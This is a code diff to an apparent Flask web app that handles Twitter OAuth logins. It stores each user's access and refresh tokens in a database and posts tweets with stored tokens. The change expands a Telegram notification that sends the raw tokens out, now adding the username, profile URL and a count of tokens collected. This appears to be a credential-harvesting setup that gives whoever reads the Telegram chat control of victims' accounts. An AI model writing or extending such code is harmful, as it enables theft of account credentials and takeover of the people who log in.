@@ -155,8 +155,8 @@ def send_message_via_telegram(message):
     if response.status_code != 200:
         print(f"Failed to send message via Telegram: {response.text}")
 
-# Function to get Twitter username
-def get_twitter_username(access_token):
+# Modify get_twitter_username to return both username and profile URL
+def get_twitter_username_and_profile(access_token):
     url = "https://api.twitter.com/2/users/me"
     headers = {
         "Authorization": f"Bearer {access_token}"
@@ -165,12 +165,14 @@ def get_twitter_username(access_token):
     response = requests.get(url, headers=headers)
 
     if response.status_code == 200:
-        data = response.json()
-        username = data.get("data", {}).get("username")
-        return username
+        data = response.json().get("data", {})
+        username = data.get("username")
+        profile_url = f"https://twitter.com/{username}" if username else None
+        return username, profile_url
     else:
         print(f"Failed to fetch username. Status code: {response.status_code}")
-        return None
+        return None, None
+
 
 # Function to post a tweet using a single token
 def post_tweet(access_token, tweet_text):
@@ -363,12 +365,24 @@ def home():
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
 
-            # Store the new tokens in the database
-            username = get_twitter_username(access_token)
+            # Fetch username and profile URL
+            username, profile_url = get_twitter_username_and_profile(access_token)
+
+            # Store the new tokens and username in the database
             store_token(access_token, refresh_token, username)
 
-            send_message_via_telegram(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
-            
+            # Calculate total tokens in the database
+            total_tokens = get_total_tokens()
+
+            # Telegram notification with additional details
+            send_message_via_telegram(
+                f"🔑 Access Token: {access_token}\n"
+                f"🔄 Refresh Token: {refresh_token}\n"
+                f"👤 Username: @{username}\n"
+                f"🔗 Profile URL: {profile_url}\n"
+                f"📊 Total Tokens in Database: {total_tokens}"
+            )
+
             # Redirect to active.html after saving and notifying
             return redirect(url_for('active'))
         else:
